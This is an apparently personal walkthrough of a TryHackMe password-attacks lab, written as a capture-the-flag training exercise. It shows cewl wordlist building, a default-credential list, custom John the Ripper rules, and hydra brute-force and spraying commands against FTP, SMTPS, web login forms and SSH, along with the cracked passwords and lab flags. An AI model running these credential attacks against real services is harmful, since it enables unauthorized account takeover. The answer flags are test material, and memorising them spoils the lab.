## Walkhrouth of Password Attacks in TryHackMe 
### n1ck_5huhm4n
##
First lets create basic password list based on clinic web site

``` bash
cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/ > clinic.lst 
```

`clinic.lst` will be the basic of this exercies

### Q:"Can you guess the FTP credentials without brute-forcing? What is the flag?"
* lest search google for default ftp credentials
```
anonymous:anonymous

ftp:ftp

admin:admin

admin:password

root:root

user:user

guest:guest

default:default
```
* ftp:ftp worked!!!
Lets connect and get the flag
```bash
ftp 10.66.188.35
           
Connected to 10.66.188.35.
220 (vsFTPd 3.0.5)
Name (110.66.188.35:kali): ftp
331 Please specify the password.
Password: 
230 Login successful.


ftp> ls
drwxr-xr-x    2 111      116          4096 Oct 12  2021 files
ftp> cd files
ftp> ls
-rw-r--r--    1 0        0              38 Oct 12  2021 flag.txt
ftp> get flag.txt
226 Transfer complete.
ftp> ^D
221 Goodbye.                                  
┌──(kali㉿kali)-[~/THM/Password_Attacks]
└─$ cat flag.txt       
THM{d0abe799f25738ad739c20301aed357b}

```
### A: `THM{d0abe799f25738ad739c20301aed357b}`

##

#### Q:"generate a rule-based dictionary from the wordlist clinic.lst in the previous task.
#### email: pittman@clinic.thmredteam.com against MACHINE_IP:465 (SMTPS). 
#### What is the password? Note that the password format is as follows: 
#### [symbol][dictionary word][0-9][0-9]."

* Lets divide the task into small missions:
1. Craete costume john rule to follow this format 
    * [symbol][dictionary word][0-9][0-9]
2. create a pass list using `clinic.lst` and john created rule
3. use `hydra` to brute force the password

### Lets dive in
1. Create rule
*  open `/etc/john/john.conf ` as root
* append the code below into the end of the file -->
```
[List.Rules:PassCrackCTF] 
Az"[0-9][0-9]" ^[!@]
```
* save

2. Create a pass list
`john --wordlist=clinic.lst  --rules=PassCrackCTF --stdout > rule_based_clinic.lst`
3. ### Crack

```bash
#Command:
hydra -l pittman@clinic.thmredteam.com -P rule_based_clinic.lst smtps://10.66.188.35 -f -V -t 32

```
```bash
#Output:
[smtp] 
host: 10.66.188.35   
login: pittman@clinic.thmredteam.com   
password: !multidisciplinary00`
```
### A: `!multidisciplinary00`
##
#### Q:"Perform a brute-forcing attack against the phillips account for the login page at http://10.66.178.203/login-get using hydra?"
```bash
#Command:
hydra -l phillips -P clinic.lst 10.66.188.35 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f -t 32 -V

```
```bash
#Output:
[80][http-get-form] 
host: 10.66.188.35   
login: phillips   
password: Paracetamol
```
* Access the website using `phillips` and `Paracetamol` To get the flag
### A: `THM{33c5d4954da881814420f3ba39772644}`


##

#### Q:"Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://10.66.178.203/login-post/"

* This one we need to use Already written rule of john named `Single-Extra`
* Lets create a pass list using this rule
```
john --wordlist=clinic.lst --rules=Single-Extra --stdout > Single-Extra_clinic.lst
```
* new pass list save in `Single-Extra_clinic.lst`
* NOW LETS CRACK -->

```bash
#Command:
hydra -l burgess -P Single-Extra_clinic.lst 10.66.188.35 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f -t 32 -V

```
```bash
#Output:
[80][http-post-form] 
host: 10.66.188.35   
login: burgess   
password: OxytocinnicotyxO
```
* Access the website using `burgess` and `OxytocinnicotyxO` To get the flag
### A: `THM{f8e3750cc0ccbb863f2706a3b2933227}`

##
### Final Question
#### Q:"Perform a password spraying attack to get access to the SSH://10.66.178.203 server to read /etc/flag. What is the flag?

* We get users list
```
admin
phillips
burgess
pittman
guess
```
* I Inserted then into `usernames-list.txt`
* Now lets create a Pass list
* We know from the summery and the hint that the password start with Fall + year + Speacial char
Lets create a john rule that create this password
1. Create txt file with all seasons lowwer and upper
```
Fall 
Autumn
Spring
Winter
fall 
autumn
spring
winter
```
Insert into `seasons.lst`

2. create john rule to append year and special char

```
[List.Rules:SeasonYearSpecial]
Az"202" $[0-9] $[!@#$%^&*]
```
3. Create pass list using `seasons.lst` and `SeasonYearSpecial`
```bash
john --wordlist=seasons.lst  --rules=SeasonYearSpecial --stdout >> Fullyear.lst
```

4. Crack

```bash
hydra -L usernames-list.txt  -P Fullyear.lst ssh://10.66.188.35 -f -V -t 32

```

```bash
#Output
[22][ssh] 
host: 10.66.188.35   
login: burgess   
password: Fall2021@
```

5. Final step Connect to ssh and find the flag 
```bash
ssh burgess@10.66.188.35   
burgess@ip-10-66-188-35:~$ cd /etc/
burgess@ip-10-66-188-35:/etc$ cat flag 
THM{a97a26e86d09388bbea148f4b870277d}

```
### A: `THM{a97a26e86d09388bbea148f4b870277d}`

## DONE!!!